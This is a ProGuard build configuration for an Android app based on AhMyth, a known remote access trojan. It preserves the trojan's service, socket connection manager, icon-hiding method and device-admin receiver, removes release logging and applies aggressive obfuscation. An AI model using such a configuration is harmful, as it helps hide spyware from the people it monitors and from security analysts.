# Configuración básica de Proguard
-optimizationpasses 5
-dontusemixedcaseclassnames
-dontskipnonpubliclibraryclasses
-dontpreverify
-verbose
-optimizations !code/simplification/arithmetic,!field/*,!class/merging/*

# Mantener clases nativas
-keepclasseswithmembernames class * {
    native <methods>;
}

# Mantener clases de Android
-keep public class * extends android.app.Activity
-keep public class * extends android.app.Service
-keep public class * extends android.content.BroadcastReceiver
-keep public class * extends android.content.ContentProvider
-keep public class * extends android.app.backup.BackupAgentHelper
-keep public class * extends android.preference.Preference

# Mantener clases de Kotlin
-keep class kotlin.** { *; }
-keep class kotlinx.** { *; }
-dontwarn kotlin.**
-dontwarn kotlinx.**

# Mantener recursos y clases R
-keepclassmembers class **.R$* {
    public static <fields>;
}

# Mantener clases específicas de AhMyth
-keep class ahmyth.mine.king.ahmyth.MainService {
    public static void startService(android.content.Context);
    public static void start();
    public static android.content.Context getContextOfApplication();
    *;
}

-keep class ahmyth.mine.king.ahmyth.ConnectionManager {
    public static void startAsync(android.content.Context);
    public *;
}

-keep class ahmyth.mine.king.ahmyth.MainActivity {
    public void onCreate(android.os.Bundle);
    public void fn_hideicon();
    *;
}

-keep class ahmyth.mine.king.ahmyth.MyReceiver {
    public void onReceive(android.content.Context, android.content.Intent);
    *;
}

-keep class ahmyth.mine.king.ahmyth.AdminReceiver {
    public void onReceive(android.content.Context, android.content.Intent);
    *;
}

# Mantener métodos de callback
-keepclassmembers class * implements android.os.Parcelable {
    static ** CREATOR;
}

-keepclassmembers class * extends android.app.Activity {
    public void *(android.view.View);
}

# Socket.IO
-keep class io.socket.** { *; }
-keep interface io.socket.** { *; }
-dontwarn io.socket.**

# OkHttp
-keep class okhttp3.** { *; }
-keep interface okhttp3.** { *; }
-dontwarn okhttp3.**

# Gson
-keep class com.google.gson.** { *; }
-keep class sun.misc.Unsafe { *; }
-dontwarn com.google.gson.**
-dontwarn sun.misc.Unsafe

# Remover logs en release
-assumenosideeffects class android.util.Log {
    public static boolean isLoggable(java.lang.String, int);
    public static int v(...);
    public static int i(...);
    public static int w(...);
    public static int d(...);
    public static int e(...);
}

# Ofuscación agresiva pero compatible
-useuniqueclassmembernames
-allowaccessmodification
-mergeinterfacesaggressively

# Mantener atributos de anotaciones
-keepattributes *Annotation*
-keepattributes Signature
-keepattributes InnerClasses
-keepattributes EnclosingMethod

# Mantener métodos de serialización
-keepclassmembers class * implements java.io.Serializable {
    static final long serialVersionUID;
    private static final java.io.ObjectStreamField[] serialPersistentFields;
    private void writeObject(java.io.ObjectOutputStream);
    private void readObject(java.io.ObjectInputStream);
    java.lang.Object writeReplace();
    java.lang.Object readResolve();
}

# Excluir clases de debugging
-keep class **.$r8$debug$** { *; }

# Configuración para recursos nativos
-keepclasseswithmembernames class * {
    native <methods>;
}

# Mantener getters y setters en clases que implementan Parcelable
-keepclassmembers class * implements android.os.Parcelable {
  public static final ** CREATOR;
}

# Mantener clases de View
-keep public class * extends android.view.View {
    public <init>(android.content.Context);
    public <init>(android.content.Context, android.util.AttributeSet);
    public <init>(android.content.Context, android.util.AttributeSet, int);
    public void set*(...);
}

# Mantener clases de recursos
-keepclassmembers class **.R$* {
    public static <fields>;
}